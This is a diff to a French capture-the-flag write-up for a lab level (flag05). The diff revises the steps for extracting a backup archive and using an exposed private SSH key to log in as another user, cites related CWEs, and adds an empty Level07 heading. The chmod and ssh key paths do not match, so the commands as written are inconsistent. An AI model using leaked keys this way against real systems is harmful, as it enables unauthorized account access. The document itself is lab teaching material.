@@ -70,9 +70,9 @@ Exploiter la clé privée exposée pour se connecter directement en tant que fla
 
 Étapes :
 
-
-chmod 600 /tmp/flag05_id_rsa
-ssh -i /tmp/flag05_id_rsa flag05@localhost
+tar xzvf .backup.tgz /home/level05/
+chmod 600 .ssh/tmp/id_rsa
+ssh -i .ssh/id_rsa flag05@localhost
 
 Une fois connecté :
 
@@ -83,3 +83,6 @@ getflag
 - CWE-522 – Identifiants insuffisamment protégés
 - CWE-312 – Stockage en texte clair d’informations sensibles
 - CWE-276 – Permissions par défaut incorrectes
+
+## Level07
+
